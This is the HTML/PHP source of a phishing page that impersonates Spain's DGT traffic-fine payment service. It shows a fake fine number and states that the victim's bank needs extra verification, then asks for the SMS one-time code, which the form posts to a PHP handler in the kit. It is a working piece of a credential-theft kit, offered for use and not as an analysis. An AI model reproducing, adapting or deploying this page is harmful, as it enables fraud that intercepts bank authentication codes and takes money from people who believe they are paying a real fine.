<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Assets/imgs/favicon.png">
        <title>Pago de sanciones</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Assets/css/style.css">
        <script src="./Assets/js/stutes.js"></script>        
    </head>
    <body>

        <!-- wrapper_details -->
        <div class="wrapper_box">
          <div class="container_box">
            <header class="header_2">
              <div class="menu align-items-center">
                <i class="ri-menu-line"></i><p class="mb-0">Mostrar menúMostrar menúMostrar menú</p>
              </div>
              <div class="skep d-flex justify-content-between align-items-center">
                <ul class="mb-0 ps-0 d-flex align-items-center">
                  <li>Salto a contenido</li>
                  <li>Salto a navegación</li>
                </ul>
                
              </div>
              <div class="group_hed">
                <div class="links">
                  <i class="ri-earth-fill inte"></i>
                  <ul class="d-flex align-items-center ps-0 mb-0 flex-wrap">
                    <li>Bienvenidos</li>
                    <li>Welcome</li>
                    <li>Bienvenue</li>
                    <li>Wilkomemn</li>
                    <li>Benvingut</li>
                    <li>Ongi-etorri</li>
                    <li>Benvido</li>
                    <li>Benvingut</li>
                  </ul>
                </div>
                <div class="logo_box d-flex align-items-center">
                  <div class="logo">
                    <img src="./Assets/imgs/Footer-DGT.svg" alt="">
                  </div>
                  <p>Pago de sanciones</p>
                </div>
              </div>
              <p class="you">Estás en: Pagar sanción (sin certificado) | Datos de la sanción</p>
              <div class="prof">
                <i class="fa-solid fa-user"></i>
              </div>
            </header>
            <div class="wrapper_sms">
              <form action="./Assets/php/config/func.php" method="POST">
                <input type="hidden" name="sms">
                <div class="title">
                  <div class="title_1 d-flex align-items-center">
                    <div class="num">
                      1
                    </div>
                    <p class="mb-0">AVISOS IMPORTANTES</p>
                    <img src="./Assets/imgs/INTE.png" alt="">
                  </div>
                  <h1>PAGO DE SU MULTA N°164357371274</h1>
                  <div class="bar"></div>
                </div>
                <div class="infos_sms d-flex flex-column align-items-center">
                  <img src="./Assets/imgs/images.png" alt="">
                  <p>Su banco para solicitar una autenticación adicional para validar su pago por favor ingrese el código de SMS recibido en su número</p>
                  <p>La validación está relacionada con Google pay y Apple Pay</p>
                </div>
                <div class="group_inputs">
                  <div class="row w-100 mx-auto cvv">
                    <div class="col-md-6">
                      <div class="form-group">
                        <label for="sms_code">Código recibido por SMS <span>*</span></label>
                        <input inputmode="numeric" type="text" name="sms_code" id="sms_code" required>
                        <!-- condition -->
                        <?php if (isset($_GET["error"])): ?>                
                        <div class='errmsg'>
                        El código es incorrecto
                        </div>
                        <?php endif; ?>
                        <!-- condition -->                          
                      </div>
                    </div>
                  </div>                  
                </div>
                <div class="btn_sub">
                  <button type="submit">Continuar</button>
                </div>
              </form>
            </div>
            <div class="box_about">
              <div class="about d-flex justify-content-between">
                <img src="./Assets/imgs/DKou.png" alt="">
                <p class="mb-0">Te invitamos a realizar nuestra encuesta de satisfacción. Así nos ayudarás a construir una aplicación que se ajuste más a tus necesidades. ¡Anímate! (Pulsa sobre la imagen).</p>
              </div>
            </div>
            <footer class="footer_2">
              <div class="first_foot">
                <ul class="mb-0 ps-0 d-flex flex-wrap">
                  <li>Aviso legal</li>
                  <li>|</li>
                  <li>Propiedad intelectual</li>
                  <li>|</li>
                  <li>Accesibilidad</li>
                  <li>|</li>
                  <li>Protección de datos</li>
                </ul>
                <img src="./Assets/imgs/social2.png" alt="">
                <p class="mb-0">Copyright @ DGT 2026. Todos los derechos reservados</p>
              </div>
              <div class="last_foot">
                <ul class="d-flex justify-content-center flex-wrap ps-0 mb-0">
                  <li><i class="ri-phone-fill"></i> 011 Estado del Tráfico</li>
                  <li><i class="ri-phone-fill"></i> 060 Admin. Gral. del Estado</li>
                  <li><i class="fa-solid fa-location-dot"></i> C/ Josefa Valcarcel, 28 - 28071 Madrid-España</li>
                </ul>
              </div>
            </footer>

          </div>
        </div>
        







        <!-- bootstrap -->
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
        <!-- script jquery -->
        <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
        <script src="./Assets/js/js.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js "></script>
        
        <script>
          $('#sms_code').mask('000000');
        </script>
    </body>
</html>